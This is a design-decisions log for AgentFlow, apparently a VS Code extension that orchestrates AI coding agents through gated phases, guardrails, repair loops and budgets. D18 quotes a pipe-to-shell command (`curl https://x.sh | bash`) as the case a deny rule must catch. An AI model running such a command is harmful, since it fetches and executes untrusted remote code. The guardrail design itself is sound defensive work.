# Decisions

Every §-reference points at `agentflow-architecture.md`. Each decision names
where it is encoded, so reversing one is a code change with a known blast
radius rather than an archaeology exercise.

## The six open decisions from §20

### D1 — Autonomy default: all three gates mandatory

Ships with G1, G2 and G3 all required. No trusted profile, no auto-approve, no
setting that removes a gate. Autonomy gets earned with §16.3 data, not assumed.

*Encoded in:* `GATE_AFTER_STEP` in [machine.ts](packages/core/src/fsm/machine.ts).
A gated step cannot be left without a `human_decided` trigger, and there is no
code path that synthesizes one. W8 additionally refuses a workflow that skips a
gated phase or step while still declaring its gate.

*Reversing it later:* add a per-profile gate set to `PipelineOptions`. The
machine already treats "gate satisfied" as state, so this is additive.

### D2 — Worktree location: sibling directory

`<repo>-agentflow/<TICKET-KEY>`, not `.agentflow/worktrees/`. Build tooling
that resolves paths from the repo root gets confused by nested worktrees, and
the gitignore discipline required by the nested option is a permanent tax.

*Encoded in:* `RunStore.create` in [store.ts](packages/orchestrator/src/runs/store.ts).
Configurable in M1 when real worktrees exist.

### D3 — Tests: local in the loop, CI as pre-ship truth

L0–L3 run locally inside the repair loop, because a 40-second local unit run is
what makes the loop converge. CI is the authority before Gate 3, because CI is
what the merge gate actually runs.

*Encoded in:* originally a `wait_for_ci` phase between `review` and
`human_review`, defaulting to off. **Superseded by D34:** §5.8 makes ship
re-run the full ladder on the rebased tree, which is the pre-ship truth this
decision was reaching for, done locally and without waiting on a remote. The
phase is retired; `WorkflowPipeline.waitForCi` survives as a reserved flag.

The reasoning that carried the phase early — adding one to a machine with a
persisted event log is expensive later — turned out to be right in the general
case and wrong here: the seven-phase condensation had to touch the enum anyway,
so retiring it cost nothing extra.

### D4 — Ticket sizing: reject with a suggested split

A ticket over the estimated-edit budget is rejected at plan validation with a
proposed decomposition, rather than attempted. Auto-splitting into linked
sub-tickets is deferred.

*Encoded in:* rule 7 of `PLAN_VALID` (§5.5) in
[plan.ts](packages/agent-runtime/src/phases/plan.ts).

### D5 — The human's uncommitted work: explicit base ref

Runs branch from `origin/<base>` so local WIP is invisible to the agent, which
is the right default. "Base this run on my current branch" is expressible
rather than a special case: `RepoRef.baseRef` is a first-class field and
`CreateRunParams.baseRef` plumbs it through from the UI.

*Encoded in:* `RepoRef` in [domain.ts](packages/protocol/src/domain.ts).

### D6 — Multi-repo: one repo in v1, not one repo by definition

§20.6 warns that retrofitting is expensive, so the identifiers are
repo-qualified now even though nothing reads them yet:

- `RepoId` exists as a distinct type, and `RepoRef` carries an `id`.
- `Task.repo` is an optional `RepoId` defaulting to the run's single repo.

Adding a second repo becomes an additive schema change rather than a break in
a persisted event log. `Run.repo` stays singular until v2 actually needs it —
speculatively pluralizing it would complicate every call site today to buy
nothing.

## Decisions made while building M0

### D7 — Human gates are evaluated on *exit*, not entry

§5's state diagram gates the transitions *out of* the work that produces the
artifact. So a gated stage is entered normally, does its work, and only then
parks in `waiting_human`. Gating on entry would park the run before the
artifact the human is meant to judge exists.

*Amended by D35:* with the seven-phase vocabulary the gate hangs off a **step**
exit rather than a phase exit — `questions`, `validate_plan`,
`triage_findings`. The principle is unchanged; what moved is the granularity,
because G2 now has work after it inside the same phase.

### D8 — A loop-back clears the gate it invalidates

`MachineState.gatesPassed` is cleared for the relevant gate whenever the run
loops backward: a scope change clears G1, thrash-driven replanning clears G2,
a "request revision" clears its own gate. Without this, a revised plan would
sail past Gate 2 on the strength of an approval given to a different plan —
which is exactly how gates become theatre (§7.1).

### D9 — An illegal transition is an error, never a silent no-op

`transition()` returns `{ok: false, reason}` rather than ignoring a trigger it
does not expect, and the orchestrator writes that reason to the event log. A
swallowed trigger is how a run stalls forever with a spinner and no
explanation.

### D10 — Replay is authoritative; `state.json` is only a cache

`RunStore.restore()` deliberately does not read `state.json`. If replay and the
snapshot ever disagree, replay is right. The snapshot exists to make the first
paint fast, and deleting it must never lose information (§3.3). A property test
asserts `replay(snapshot) ≡ fold(events)` for arbitrary event sequences.

### D11 — A spike keeps all three gates

§5.9 says a spike skips Build and Ship. It is silent on review. The call: a
spike skips the `auto_review` step — there is no diff for an automated code
review to read — but **keeps** the `review` phase, where G3's question becomes
"are these findings good?" rather than "is this code I would merge". This keeps
the three-gate invariant uniform across every profile and gives the spike a
real terminus.

The seven-phase vocabulary expresses this better than the old one did: it is
`skip: [build, ship]` plus `skipSteps: [auto_review]`, which says exactly what
is dropped and exactly what is kept.

### D12 — Questions route through the broker, never straight to the log

An agent asking a question calls the broker, which applies the §7.2 cap and the
`alreadyChecked` requirement and *may refuse*. Only an accepted question is
written to the event log. Logging first would make the cap unenforceable, since
the UI renders from the log.

## Decisions made building M1's foundation

### D13 — A "profile that skips Q&A" keeps its phase and its gate

§5.10 says `chore` and `refactor` skip clarify. Taken literally that drops G1
with it, which collides with D1's three mandatory gates — and W6 caught the
contradiction the first time the built-in workflows were validated.

The resolution: those workflows keep the `questions` step (`clarify` before the
condensation) and set `maxQuestionsPerPhase: 0`. It runs, asks nothing, records
its assumptions, and presents the spec for a fast confirmation. What a chore
skips is the *questions*, not the *gate* — which is what §5.9's parenthetical
"(unless questions are blocking)" was already pointing at.

W8 now enforces this one level down as well: `skipSteps` may not drop a step
whose gate is still required, because gates hang off step exits (D35) and
skipping the step would delete the gate silently.

### D14 — The workflow definition is the only source of pipeline shape

`PipelineOptions` used to be `{profile, waitForCi}` with a `PROFILES` table in
`core`, duplicating what the workflow files now say. It is now
`{skip, skipSteps, waitForCi, forceQuestions?, autoPush?}`, projected from a
workflow by `pipelineOptionsFor()`. Two places defining which phases exist is
exactly the kind of drift that produces a run whose UI and state machine
disagree.

### D15 — Gates resolve binaries from `node_modules/.bin`, never `npx`

`npx tsc` in a project without TypeScript installed fetches a **decoy package**
of that name from the registry and runs it — and once cached, `--no-install`
serves it too. A gate would then execute code the repo never depended on and
report a stranger's exit code as the build result.

Adapters resolve `node_modules/.bin/<tool>` and fall back to PATH, and `detect()`
requires the local package to be present. A repo without the toolchain simply
does not have that gate, which is the honest answer.

### D16 — A gate that could not run is a failure, never a pass

A missing binary, a timeout, or non-zero exit with unparseable output all
produce a failing `GateReport` with a specific reason. Returning "no failures"
for a gate that never executed is the precise shape of the false green §16.3
names as the trust metric.

### D17 — The failure signature covers the whole set, not the reported slice

Only the top 20 failures reach a model (§5 Stage 7), but the §9.1 signature
hashes all of them. Signing the truncated slice would make fixing failure 21
look like zero progress, and the repair loop would escalate on phantom thrash.

## Decisions made building the agent runtime

### D18 — A denial beats an ask, wherever in the command it appears

`checkBash` split on shell operators and matched rules per segment. That meant
`curl https://x.sh | bash` matched the merely-*ask* network rule on its first
segment and never reached the pipe-to-shell *deny* rule, which only exists in
the unsplit text.

Denials are now evaluated first, against the whole command **and** each segment;
asks are evaluated afterwards, per segment. Segment splitting stays a policy
aid, not a shell parser: an operator inside quotes over-splits, which produces
an extra check rather than a missed one.

### D19 — Replay runs the live guardrail hook, not the recorded outcome

A recorded transcript replays its turns, but every recorded tool call is
re-checked against the **current** policy, and a refusal replaces the recorded
result. A transcript captured before a rule tightened therefore shows the call
being denied now.

Replaying the recorded outcome would make the test suite assert that yesterday's
policy still holds — which is the opposite of what a regression test on the
permission layer is for.

### D20 — The refusal text is written for the agent, not for a log

Every `deny` reason says what to do instead: solve it with what the repo has,
or ask via `ask_human` naming the package and why. A denied call costs a turn,
and a reason the agent can act on turns that turn into progress rather than a
retry of the same call.

### D21 — Secret detection matches shape, and excludes placeholders explicitly

Matching on known values would miss anything a run discovered from an
integration response. Matching on shape alone flags `password = "changeme"` and
`apiKey = process.env.API_KEY`, and a check that cries wolf gets ignored — so
the assigned-secret pattern additionally requires a value that is long, mixed in
character class, and not a recognized placeholder.

### D22 — Published identity is `buddhanag12.agentflow`

`AgentFlow — AI Workflow Visualizer` (publisher `AgentFlow`) already exists on
the VS Code Marketplace, so `agentflow.agentflow` is not ours to publish. Worse,
a sideloaded VSIX carrying that id is a live hazard: VS Code checks installed
extensions for updates **by id**, so a local build under a published id can be
silently replaced by the stranger's extension.

Marketplace uniqueness is `publisher.name`, so changing only the publisher
resolves it — the project keeps the name AgentFlow throughout the code, the
architecture doc, and this file. `displayName` is "AgentFlow — Ticket to PR" so
the two are distinguishable in search results.

Publishing requires registering the `buddhanag12` publisher at
<https://marketplace.visualstudio.com/manage>; the id is unclaimed as of now.

The id is what user settings and keybindings bind to, so it does not change
again without breaking people.

### D23 — Structured output is not optional for a phase the orchestrator consumes

The first live harvest returned prose and failed its schema check, because
`SessionOptions.outputSchema` was never passed through to the SDK's
`outputFormat`. §6.3 lists structured output as a context-discipline measure,
but it is stronger than that: a phase whose result the orchestrator *parses*
cannot advance without it, so the wiring is load-bearing rather than an
optimization.

Two SDK-specific details that cost a run each to discover: `z.toJSONSchema()`
stamps a `$schema` pointing at draft 2020-12 which the CLI's validator refuses
to resolve, so the provider strips it; and the SDK is ESM-only against these
CommonJS packages, so the runtime import has to stay opaque to TypeScript or it
is downlevelled to `require()` and fails.

### D24 — The spawned agent inherits the developer's Claude Code context

The first successful harvest cited "user memory" in its risk list — it had read
memory files belonging to the developer's own Claude Code session, despite
`settingSources: []`.

That is useful by accident and wrong by design: a run's behaviour would differ
per machine, which breaks the reproducibility the replay model and the eval
harness (§16.3) both depend on. Left as a known issue for now; the fix belongs
with the phase executors, not the provider.

### D25 — Provenance is a quote, and the quote is checked

§5 Stage 2 requires a `source` on every acceptance criterion. A source that is
only a label (`"jira:comment:88231"`) is unfalsifiable — the model can write one
for a requirement it invented.

So `Provenance` carries a verbatim `quote`, and SPEC_VALID rules S1/S2 check that
the quote actually appears in the ticket or the harvest digest, compared with
whitespace and case normalized. The model can still write any statement it likes;
it cannot manufacture the evidence for it. Design references are exempt because
the frame text is not available to compare against yet.

This is the cheapest anti-hallucination measure in the system, and the first live
run produced eleven criteria that all passed it.

### D26 — A task's check says how, not just which gate

§5 Stage 4 requires every task to carry a machine-checkable acceptance
criterion. Naming the gate alone (`"unit"`) is not enough to be falsifiable —
any task can claim the unit gate covers it.

So `TaskCheck` is `{gate, how}` where `how` states concretely what proves it: a
named test case, a grep, a command scope. The live run produced checks like
"`git diff --name-only` lists only packages/orchestrator/src/{...}" and
"grep shows no environment or credential value interpolated into a log record".
Those are verifiable claims; "the unit gate covers this" is not.

This also feeds Appendix A's "tell the agent how it will be judged" — the
implementer receives the exact command that will decide its work.

### D27 — Planning is the expensive phase, and that is the right place to spend

The first full run cost $1.54: harvest $0.15, spec $0.27, plan $1.12. Planning
alone is more than twice the other two combined, because the planner runs on
opus at xhigh effort while harvest runs on sonnet at low.

That is the §15.1 model-routing lever working as intended rather than a problem
to fix. A bad plan is paid for repeatedly in the repair loop; a good one is paid
for once. Revisit only if the ratio moves after the implement phase exists and
the true per-run total is known.

### D28 — Guardrails go in `PreToolUse`, not only `canUseTool`

The first live implement run reported three files written and a `filesTouched`
of `[]`. The cause: `permissionMode: 'acceptEdits'` pre-approves edits inside
the workspace, so the SDK never consults `canUseTool` for them. **Every guardrail
was being bypassed on exactly the calls that write.**

§7.4 already says this — Layer 1 is a `PreToolUse` hook that "runs before every
tool call"; Layer 2 is `canUseTool`, "for calls that fall through policy to a
prompt". Implementing only Layer 2 silently produced a system with no Layer 1.
Both are wired now, and the hook is the binding one.

Worth remembering as a class of bug: a permission layer that is never invoked
looks exactly like a permission layer that always allows.

### D29 — Only a write counts against the touch budget

The same run counted every `Read` against `maxFilesTouched`, so a task that
explored three files before editing had already spent its budget. Reads are how
a task does its job; the budget exists to stop scope creep, which is a property
of writes.

### D30 — A worktree shares `node_modules`, and sharing is not a change

A fresh worktree has no `node_modules`, so every gate in it fails with a
module-resolution error that reads like a code problem and is not — the first
run's implementer correctly reported it could not verify its own work, and was
right. `WorktreeManager` now symlinks shared entries (§12.6) on create, and
excludes them from `changedFiles` so infrastructure never reaches the review
surface as a diff.

### D31 — A driver runs the phase the run is in, it does not advance into it

`RealRunDriver.start()` began with `step({kind:'advance'})`, which moved the run
out of `intake` before intake's work ran. Intake is where the worktree is
created, so harvest then executed with an undefined cwd — against the
developer's own checkout rather than an isolated tree. It was read-only, so
nothing was harmed, but the isolation the whole parallel model depends on was
simply not in effect, and nothing said so.

`start()` now runs the current phase, and `harvest` refuses to run without a
worktree rather than silently falling back to the process's cwd. A phase that
cannot have its isolation must fail, not proceed.

### D32 — Phase transitions chain, they are not dropped

A phase advances by calling `step` from inside its own execution, so the next
phase is always requested while the current one is still in flight. The
in-flight guard originally returned the running promise, which dropped the
request and stalled every run after its first phase. Requests now chain.

### D33 — The real driver is the default; simulation is opt-in

`AGENTFLOW_SIMULATE=1` selects the fake driver. It is what the daemon tests and
UI work use — they must be deterministic and free. Everything else gets the real
phases, because a default that simulates is a default that lies.

## Decisions made condensing the pipeline to seven phases

### D34 — Seven phases, and the finer work becomes a `Step`

Watching a full run walk thirteen phase transitions made the granularity that
reads well in a document read badly on a board. §5.1 replaces it: seven phases
— `intake`, `preflight`, `context`, `plan`, `build`, `review`, `ship` — with a
`Step` for what happens inside one. Seven pills in the UI; steps in the run
detail.

Three things fell out of the condensation rather than being decided separately:

- **`intake` and `harvest` merged**, which is what prompted the exercise:
  harvest is now the first step of `context`.
- **There is no terminal `done` phase.** It was never a stage of work, only a
  marker for a terminal status, and `RunStatus` already carries that. A
  finished run sits at its last phase with `status: 'succeeded'`.
- **`wait_for_ci` is retired**, superseding D3's placement. §5.8 re-runs the
  full ladder on the rebased tree, which is the pre-ship truth D3 wanted,
  obtained locally instead of by waiting on a remote. `waitForCi` remains in
  `WorkflowPipeline` as a reserved flag rather than being deleted from every
  workflow file on disk.

`repair` and `human_review` are steps but are deliberately absent from
`STEP_ORDER`: a trigger enters them — a red gate, a parked gate — never falling
off the end of the previous step. A test asserts exactly those two are
unsequenced, so a third slipping in gets noticed.

Gate count did not change. It was never the problem.

### D35 — The gate hangs off a step exit, not a phase exit

D7 gated phase exits, which was correct while each gated phase had one piece of
work in it. §5.5 breaks that: `decompose` runs **after** G2, inside the same
`plan` phase. A phase-exit gate would compile work packets from a plan no human
had yet approved — precisely the thing G2 exists to prevent.

So `GATE_AFTER_STEP` maps `questions → G1`, `validate_plan → G2`,
`triage_findings → G3`, and `advance` checks the step's gate before walking to
the next step. `human_review` is where a run sits while G3 is held, which is
also what §3.1 calls it.

### D36 — A pre-2.0.0 log is migrated on read, and never rewritten

Narrowing the `Phase` enum was a silent data-loss bug waiting to happen:
`parseLine` drops any line that fails `RunEvent.safeParse`, so every
`phase_entered: 'harvest'` in the six run logs already on disk would have
vanished with no error — and a log that lost half its events looks exactly like
a log that was never written.

`migrateRawEvent` runs before the parse. Ten legacy phase names become
`step_entered` events, which carry strictly *more* information than they did as
phases, since a step implies its phase through `PHASE_OF_STEP`. `done` folds
into `ship`; `wait_for_ci` has no equivalent and is dropped **and counted**, and
the daemon logs the count on restore. Verified against the six real logs: 31
events migrated, 0 dropped, and every line still accounted for.

Migration happens on read only. The log is append-only and is the audit trail
(§3.3) — rewriting history to fit a newer schema would destroy the thing it
exists to preserve.

One bug this surfaced: replaying a migrated log produced `ship/human_review`, a
phase/step pair the machine cannot generate, because a bare `phase_entered` left
the previous phase's step current. `phase_entered` now clears the step.

### D37 — Starting a run is its own trigger

`driver.start()` used to apply `{kind: 'advance'}`, which both marked the run
running and moved it off its first step. With a step vocabulary that means
`classify` never executes, and D31's point — a driver runs the phase the run is
*in*, it does not advance into it — stops holding at the step level too.

`{kind: 'start'}` is legal only from `queued`, keeps phase and step where they
are, and emits `run_step` for the step the run is already on. It also gets the
`status_changed` transition into the log, which `advance` was producing as a
side effect of something else.

## Decisions made wiring commits and ship

### D38 — The build phase commits per task, and the task cycle lives in the driver

Nothing in the pipeline committed. `WorktreeManager.checkpoint`, `restore` and
`commit` had been built and tested since M1's foundation and were never called,
so three things were quietly untrue at once: §5.6's per-task commits were not
happening, §11.2's rewind had no checkpoint to rewind *to* — the repair loop
could only ever go forwards — and a finished run left a dirty worktree while the
README claimed "the branch is ready."

Wiring the commit exposed an ordering bug in the first attempt. `implement`
looped every task and only then did `verify` run the gates, so a per-task commit
would have swept the *next* task's files into the previous task's commit, and
each task's gates would have read a tree containing half-finished work from
tasks after it. Bisectable history is the whole reason the commit is per task,
and that shape destroys it.

§5.6 already says the answer — "cycling per task in DAG order" — so the cycle is
now: checkpoint, implement, that task's declared gates, commit on green. A red
gate reports `gate_failed` before any commit, so a failing task leaves the
green ones landed and nothing else.

The cycle lives in the **driver**, not the state machine. Expressing it in the
FSM would need the task list in `MachineState`, and the machine does not know
about tasks. `STEP_ORDER`'s `[implement, verify]` stays the phase's shape for
the board, and `verify` is the whole-tree `ALL_GATES_GREEN` check — two tasks
can each pass their own gates and still break each other, so the tree gets its
own pass. Revisit if the repair loop needs to resume mid-task across a restart.

### D39 — A rebase conflict aborts, and a dirty tree is refused before it starts

§13.3 forbids auto-resolution, and the reason is sharper at ship time than
anywhere else: a machine-resolved conflict is a silent semantic change to code
a human already approved at G3.

Two things beyond reporting it. The rebase is **aborted**, because a tree left
mid-rebase is a state nothing else in the system knows how to read — the resume
guard, the gate runner and `changedFiles` would all be looking at a detached
mess. And a dirty tree is refused *before* the rebase runs rather than failing
halfway through one; by ship time everything should be committed, so anything
uncommitted is unexplained and worth stopping for.

`git`'s exit code decides all of this. The first version inferred failure from
stderr text, which reads a passing command as failing the moment git changes its
wording, so `GitResult` now carries `exitCode`.

### D40 — Ship succeeds at hand-off rather than parking in `waiting_human`

§5.8 says the run "parks in `waiting_human` with a *Ready to push* card". It
reaches `succeeded` instead, with the PR package written to
`artifacts/pr-package.md` and recorded as an artifact.

The reason is that `waiting_human` is, everywhere else in the system, a run with
a *decidable* pending item — and D-nothing-in-particular already established
that an approval sitting in the inbox with nothing behind it produces an error
rather than an outcome when clicked. A hand-off has nothing to decide: the work
is done, and pushing is the human's action taken outside the tool. Adding a
fourth click to acknowledge it is also uncomfortably close to the pre-ship
confirmation that was proposed and withdrawn as "quite lazy".

What §5.8 actually wanted from `waiting_human` — the run survives a restart and
releases its slot — a `succeeded` run does too. The only difference is which
group it sits under in the tree.

*Reversing it later:* give the broker a non-approval `handoff` pending kind and
park on it. That is additive; nothing here forecloses it.

### D41 — The PR title comes from the ticket, the body from the spec

The first version titled the PR with the first sentence of `spec.problem`, which
produced `FWERP-2922: The run detail view has no way to see which commands a run
actually e…`. A problem statement says what is wrong; a PR title says what the
change does, and `ticket.summary` is already a human's name for the work.

The body keeps the spec, because that is where the spec earns its place: the
"how to verify manually" section hands over the acceptance criteria in the
ticket's own words. Gate output proves the code does what the tests say; it
cannot prove the tests say the right thing, and that gap is exactly what the
reviewer is for. A package with no gate results says so in as many words —
"No gate ran, which is not a pass. Do not merge this." — rather than rendering
an empty table that reads like a clean bill of health.

## Decisions made making the packaged extension actually run

### D42 — The SDK is vendored beside the bundle, and drives the developer's own CLI

An installed build failed on activation with `Cannot find package
'@anthropic-ai/claude-agent-sdk' imported from .../dist/orchestrator.js`. It had
never failed under F5, and the reason it had not is the interesting part: the
Extension Development Host runs against the *workspace*, which has a
`node_modules`, so a bare specifier resolved. Installed into
`~/.vscode/extensions/...`, nothing resolves it — `vsce --no-dependencies` ships
no `node_modules` at all.

The cause is D23's own fix biting back. The specifier is wrapped in
`Function('return import("…")')` so TypeScript cannot downlevel it to
`require()` — and a string inside a `Function` constructor is opaque to
**esbuild** too. So it was neither bundled nor resolvable: it survived verbatim
into the output as a bare import against a directory with no dependencies.
Worth remembering as a class of bug: hiding an import from the compiler hides
it from the bundler, and the two failures look nothing alike.

Bundling it was not an option. `sdk.mjs` reads `import.meta.url` to locate a
**platform-specific native CLI** from its `optionalDependencies`, and bundling
relocates `import.meta.url`. So the SDK is staged verbatim into
`dist/vendor/@anthropic-ai/claude-agent-sdk/` and imported by absolute file URL;
`sdkSpecifier()` falls back to the bare specifier so a checkout and
`agent-runtime`-as-a-library keep working unchanged.

Only `sdk.mjs` and its metadata get shipped — 2.1 MB, taking the `.vsix` from
512 KB to 945 KB. Two things made that possible:

- `sdk.mjs` imports **nothing but node builtins**. The `peerDependencies` on
  `@anthropic-ai/sdk`, `@modelcontextprotocol/sdk` and `zod` are types and
  optional APIs, not runtime requirements, and `bridge.mjs` / `browser-sdk.js`
  are separate entry points this never touches.
- The native CLI is **not shipped**. It is 192 MB for one architecture, which
  would also make the `.vsix` platform-specific. Instead `pathToClaudeCodeExecutable`
  is set to the developer's own `claude` from `PATH` — which the SDK's own error
  message names as the supported alternative, and which is consistent with the
  existing stance that being signed into Claude Code is the credential story.

Verified from an extracted `.vsix` with zero `node_modules` on disk: the module
loads, and the SDK spawns `/opt/homebrew/bin/claude` rather than reporting a
missing native binary.

### D43 — Preflight checks the CLI is present *and* signed in

`check_auth` was a no-op. A missing or unauthenticated `claude` therefore
surfaced three steps later as `harvest failed: Claude Code returned an error
result: Failed to authenticate` — which reads like a problem with the run, and
is not. That is the precise failure §5.3 exists to prevent, since discovering an
environmental problem at minute 25 wastes both the money and the trust.

It now resolves the CLI, then asks it `auth status --json` (0.2–0.6 s, cheap
enough to pay every run) and blocks with the command that fixes it. The CLI
exits 1 when signed out and still prints the JSON saying so, so a non-zero exit
is the answer rather than an error.

An **indeterminate** result deliberately does not block. An older CLI without
`auth status`, or a spawn that times out, is not evidence of being signed out,
and refusing to start on a check that could not run would break a working setup
to guard against a broken one. Only a definite `loggedIn: false` blocks. This is
the opposite of D16's rule for gates, and the asymmetry is the point: a gate
decides whether code is correct, where a false green is the worst outcome; this
decides whether to *attempt* a run, where a false block is.

`loadSdk()` got the same treatment for a different reason: a module-resolution
error says nothing about packaging, so the failure is wrapped with where a
packaged build keeps its copy, that a checkout needs `npm install`, and the
override variable.

*What this does not do:* refresh anything. A process spawned from inside a
Claude Code session inherits `CLAUDE_CODE_SDK_HAS_HOST_AUTH_REFRESH` and friends,
which tell the spawned CLI that its host will refresh OAuth for it through
callbacks this provider does not supply. That was the first suspected cause of
the failure above and it was **wrong** — stripping those variables changed
nothing, because the CLI's stored credential was simply absent
(`authMethod: "none"`). Worth recording so the next person does not re-run the
same experiment.

## Decisions made closing the false-green in the gate ladder

### D44 — A declared gate with no adapter blocks; one that does not apply warns

Every built-in workflow required `coverage`, `bug` required `repro_test` and
`refactor` required `behaviour_preservation`. None of the three had an adapter.
`GateRegistry.resolve()` returned them in `missing`, and **no caller ever read
`missing`** — so they were silently dropped. A `bug` run could report
`ALL_GATES_GREEN` having never run the reproduction check the profile exists
for.

This is D16 one level up. D16 says a gate that could not *run* is a failure;
this is a gate that was never a gate at all, and it failed in the quietest
possible way: a shorter list of gate results that nothing compared against what
was asked for.

§5.3 already separates the two cases that `resolve()` conflated, and the
distinction decides whether a run may start:

- **No adapter registered** — *the system* cannot run what the workflow
  declares. Preflight blocks, naming the gate. `verify` re-checks, because
  `ALL_GATES_GREEN` is a claim about the required set and cannot be made
  without one of them.
- **Adapter exists but `detect()` is false** — *this repo* does not support it.
  §5.3 says warn and continue, so the run proceeds with the absence recorded as
  a warning rather than inferred later from a shorter list.

Three consequences:

- A real `coverage` adapter now exists, so the id resolves. It requires a
  coverage *provider*, not just vitest: `--coverage` without one reports
  nothing and exits zero, which would make an unmeasured repo look covered.
  The workflow's `coverageThreshold` reaches it through a new optional
  `RepoContext.thresholds` — a coverage gate without a threshold is not a gate.
- `repro_test` is **removed** from `bug`. PLAN_VALID's rule P6 already rejects
  a bug plan whose first task is not a failing reproduction test, which is
  where the requirement is actually enforceable. Declaring it as a gate as well
  was a duplicate that named nothing.
- `behaviour_preservation` **stays declared** on `refactor`, which now refuses
  to run. That is the honest state: the gate that makes a refactor a refactor
  rather than a rewrite does not exist yet, and blocking says so where silently
  skipping it did not.

### D45 — A gate red on the base does not block the run

`baseline_gates` recorded `baselineFailures` and nothing ever read it, so a
pre-existing red still stopped the run — the run inherited blame for a broken
`main` and would have spent its whole repair budget chasing failures it did not
cause, which is the exact outcome §5.3's baseline run exists to prevent.

The three places that decide on a gate result — the per-task gates, the
whole-tree ladder, and ship's re-run — now exclude a gate that was already red
at baseline. It is still emitted as a `gate_result` and still reaches the human
and the PR package; it just does not stop the run.

This matters immediately rather than theoretically: `secretscan.detect()` is
unconditionally true by design ("a secret scan is not something a repo opts
into"), so on a machine without `gitleaks` it fails — correctly, per D16 — and
before this every run in such a repo would have blocked at `verify` with the
repair loop unimplemented. The baseline run sees the same red and excludes it.

## Decisions made building the repair loop

### D46 — Thrash is two attempts agreeing, not one attempt failing

The loop's signature history is deliberately **not** seeded with the failure
that triggered it. Seeding it meant a first attempt that changed nothing read as
a `repeat` and escalated immediately — skipping rung 2 of §11.2, which exists
for precisely that case ("the obvious fix did not work; read the failing test in
full"). §11.1's rule is about the loop repeating *itself*, so the comparison is
between attempts.

### D47 — The per-task loop runs inside `implement`; the whole-tree loop is a step

Two loops, one helper, because they fail differently.

A **task's own gates** going red is that task's problem, and its commit is still
pending — so the loop runs inline inside `implement`, where the task cycle and
the uncommitted tree both live. Leaving the step would strand the tasks after it,
which have not been written yet (D38).

A **whole-tree** `verify` failure is nobody's task in particular — two tasks that
each passed their own gates can still break each other — so it emits
`gate_failed`, the machine moves to the `repair` step, and `STEP_AFTER` sends it
back to `verify` on success. That also puts repair on the board, which the
inline loop cannot do without writing `step_entered` events outside the machine
and breaking the invariant that the log and the machine agree.

### D48 — `git stash create` is not a checkpoint of a clean tree

`WorktreeManager.checkpoint()` returns `git stash create`, which outputs
**nothing** when the tree is clean — and the tree is always clean before a task
starts, because the previous task committed. So the pre-task checkpoint was
absent in exactly the situation rung 4 needs it, and the rewind would have found
nothing to rewind to.

`HEAD` is the correct mark for "before this task": rewinding to it discards the
task's uncommitted work and nothing else. The driver falls back to it.

This is the second time this subsystem was built and never exercised —
`rewind_to_task_checkpoint` also only wrote a log line and never called
`restore()`. Both were invisible until something actually took the path.

### D49 — The rewind happens in the driver, not the daemon's effect handler

`rewind_to_task_checkpoint` reaches the daemon, which has no worktree and no
checkpoint sha, so it could only ever log — which is what it did. The driver
holds both, so it performs the restore before emitting `thrash_detected`.
Replanning on a half-repaired tree would hand the planner a state that no plan
describes.

### D50 — Naming the failing tests is what makes the anti-pattern real

`GuardrailContext.failingTestFiles` was plumbed through every phase and **never
populated by anything**. The §11.3 rule it feeds — refuse an edit that strips
assertions from a failing test — was therefore inert, and inert in the one place
it matters: a red gate is exactly when deleting the test is tempting.

`failingTestFilesFrom()` derives it from the gate's own failure set, so the
guardrail now knows which tests are failing whenever a repair runs.

## Decisions made building the reviewer

### D51 — The reviewer cannot write, and cannot see how the change was made

Two properties, both enforced rather than asked for.

**Cold.** A fresh session every time, never a resume or a fork. §5.7's reason is
that a reviewer inheriting the implementer's context inherits its blind spots
and tends to ratify — which makes an automated review worse than none, because
it launders an unreviewed change as a reviewed one.

**Read-only.** An empty `allowedPaths` puts the session in plan mode, so the
reviewer cannot fix what it finds. A reviewer that edits is no longer reviewing
the change that was made, and the gates that went green went green on a
different tree.

### D52 — Conformance is computed; the model only judges it

Which files the diff touched that no task predicted is a set comparison, and a
model asked to do set comparison over a long list gets it wrong occasionally —
in the direction that produces no finding. So `unplannedFiles()` computes it and
hands the list over as fact; the model decides whether each is a reasonable
consequence of the work or scope creep.

The same split as everywhere else in the system: the deterministic part is
deterministic, and the judgement is the model's (§1.4).

### D53 — A review that could not run blocks, and the review→build cycle is bounded

Two ways this could have failed quietly.

A review that errors or returns an unparseable report **blocks** rather than
passing an empty findings list to the human. An empty list reads as "nothing
wrong"; the truth would be "nobody looked". Same reasoning as D16, one layer up.

`review_findings` with blocking findings sends the change back to build, which
re-verifies and re-reviews — a cycle nothing else closes. A reviewer that keeps
reporting the same blocker would loop until the wall clock or the card ran out.
`REVIEW_ROUND_LIMIT` is 2, matching the re-spec limit: a third round of the same
argument is a question for a person, and G3 is where that question belongs.

Anti-sycophancy is one re-review, not a loop, for the same reason in reverse:
the point is to catch a reflexive pass, not to argue the reviewer into finding
something. An empty second pass is accepted — a fabricated finding is worse than
none.

## Decisions made enforcing the budgets

### D54 — The run's budget comes from its workflow, and is actually compared

Two separate failures, both of the same family as D44/D45: declared, plumbed,
read by nothing.

`Run.attemptBudget` was **four literals** in `RunStore.create`, so every
workflow's `budgets` block was decorative — a `chore` capped at $4 got the same
$8 as a `feature`, and a number a user edited in their own workflow file changed
nothing. It is now projected from the resolved workflow.

And nothing ever compared the budget to anything. Cost accumulated in
`run.cost.usd`, the cap sat in `attemptBudget.maxUsd`, and no code joined them.
`budget_exhausted` has accepted `'usd'` and `'wallclock'` since M0 and neither
was ever emitted — only `'attempts'`, and only per task. A run could spend
without limit in precisely the phases that cost most, which mattered little
while `repair` and `auto_review` were stubs and matters now that they are not.

`spentBudget()` is checked at the one place every billable step passes through,
**before** the call rather than after: noticing afterwards has already spent the
money. The escalation names the limit and both numbers, because the useful
response to a spent budget is usually to raise it.

*Per-session is not per-run.* Each phase passes `perRunUsd / N` as its own
session cap, which bounds one call and not the run — a three-task run with
repair rounds can make a dozen such calls. The per-session caps stay as a guard
against a single runaway call; the authoritative per-run limit is this check.

### D55 — A budget of N allows N attempts

The first version incremented the run's repair counter and then asked whether
the budget was spent, so `attemptsPerRun: 1` permitted zero attempts. The check
now runs before the increment.

Worth the note because the same off-by-one is available every time a budget and
a counter meet, and a budget that silently permits one fewer than it says is
the kind of thing that gets diagnosed as a model problem.

### D56 — An async rejection does not reach a synchronous `catch`

`Orchestrator.broadcast` wrapped `sendNotification` in `try`/`catch` and
discarded the promise with `void`, so a write to a closed socket — a window
closing mid-broadcast, which is routine — escaped as an unhandled rejection.
The suite reported it as an error beside passing tests, which is exactly how
such a thing survives: nothing fails.

### D57 — "Restart Orchestrator" now restarts the orchestrator

